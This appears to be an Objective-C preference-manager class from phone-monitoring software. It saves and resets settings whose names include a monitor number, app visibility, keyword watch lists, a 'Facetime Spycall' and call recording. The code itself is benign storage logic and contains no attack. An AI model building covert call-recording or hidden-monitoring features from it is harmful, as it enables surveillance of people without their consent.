/** 
 - Project name: Source_Preferences
 - Class name: PreferenceManagerImpl
 - Version: 1.0
 - Purpose: 
 - Copy right: 28/11/11, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import "PreferenceManagerImpl.h"
#import "Preference.h"
#import "PreferenceStore.h"

#import "PrefEventsCapture.h"
#import "PrefRestriction.h"
#import "PrefSignUp.h"
#import "PrefDeviceLock.h"
#import "PrefPanic.h"
#import "PrefLocation.h"
#import "PrefWatchList.h"
#import "PrefKeyword.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefHomeNumber.h"
#import "PrefMonitorNumber.h"
#import "PrefVisibility.h"
#import "PrefMonitorFacetimeID.h"

@implementation PreferenceManagerImpl

@synthesize mPreferenceListeners;

- (id) init {
	self = [super init];
	if (self != nil) {
	//	[self setMPreferenceListeners:[NSMutableArray array]];
		mPreferenceListeners = [[NSMutableArray array] retain];
	}
	return self;
}

- (Preference *) preference: (PreferenceType) aPreferenceType {
	PreferenceStore *store = [[PreferenceStore alloc] init];
	Preference* pref = [[store loadPreference:aPreferenceType] retain];
	[store release];
	return [pref autorelease];
}

- (BOOL) isPreferenceTypeExist: (PreferenceType) aPreferenceType {
    PreferenceStore *store = [[PreferenceStore alloc] init];
	BOOL exist = [store isPreferenceExist:aPreferenceType];
	[store release];
	return (exist);
}

- (void) savePreferenceAndNotifyChange: (Preference *) aPreference {
	// save to store
	PreferenceStore *store = [[PreferenceStore alloc] init];
	[store savePreference:aPreference];
	[store release];
	
	for (id <PreferenceChangeListener> listener in [self mPreferenceListeners]) {
		[listener onPreferenceChange:aPreference];
	}
}

- (void) savePreference: (Preference *) aPreference {
	// save to store
	PreferenceStore *store = [[PreferenceStore alloc] init];
	[store savePreference:aPreference];
	[store release];
}

- (void) resetPreferences {
	PreferenceStore *store = [[PreferenceStore alloc] init];
	
	// Events
	Preference* pref = [store loadPreference:kEvents_Ctrl];
	[(PrefEventsCapture *)pref reset];
	[self savePreference:pref];
	
	// Restriction
	pref = [store loadPreference:kRestriction];
	[(PrefRestriction *)pref reset];
	[self savePreference:pref];
	
	// Sign up
	pref = [store loadPreference:kSignUp];
	[(PrefSignUp *)pref reset];
	[self savePreference:pref];
	
	// Lock device
	pref = [store loadPreference:kAlert];
	[(PrefDeviceLock *)pref reset];
	[self savePreference:pref];
	
	// Panic
	pref = [store loadPreference:kPanic];
	[(PrefPanic *)pref reset];
	[self savePreference:pref];
	
	// Location
	pref = [store loadPreference:kLocation];
	[(PrefLocation *)pref reset];
	[self savePreference:pref];
	
	// Watch list
	pref = [store loadPreference:kWatch_List];
	[(PrefWatchList *)pref reset];
	[self savePreference:pref];
	
	// Keyword
	pref = [store loadPreference:kKeyword];
	[(PrefKeyword *)pref reset];
	[self savePreference:pref];
	
	// Emergency
	pref = [store loadPreference:kEmergency_Number];
	[(PrefEmergencyNumber *)pref reset];
	[self savePreference:pref];
	
	// Notification
	pref = [store loadPreference:kNotification_Number];
	[(PrefNotificationNumber *)pref reset];
	[self savePreference:pref];
	
	// Home
	pref = [store loadPreference:kHome_Number];
	[(PrefHomeNumber *)pref reset];
	[self savePreference:pref];
	
	// Monitor
	pref = [store loadPreference:kMonitor_Number];
	[(PrefMonitorNumber *)pref reset];
	[self savePreference:pref];
	
	// Visibility
	pref = [store loadPreference:kVisibility];
	[(PrefVisibility *)pref reset];
	[self savePreference:pref];
		
	// Facetime Spycall
	pref = [store loadPreference:kFacetimeID];
	[(PrefMonitorFacetimeID *)pref reset];
	[self savePreference:pref];
    
    // File activity
    pref = [store loadPreference:kFileActivity];
    [pref reset];
    [self savePreference:pref];
    
    // Call record
    pref = [store loadPreference:kCallRecord];
    [pref reset];
    [self savePreference:pref];
			
	[store release];
}

- (void) addPreferenceChangeListener: (id <PreferenceChangeListener>) aPreferenceListener {
	[[self mPreferenceListeners] addObject:aPreferenceListener];
}

- (void) dealloc {
	[mPreferenceListeners release];
	[super dealloc];
}

@end
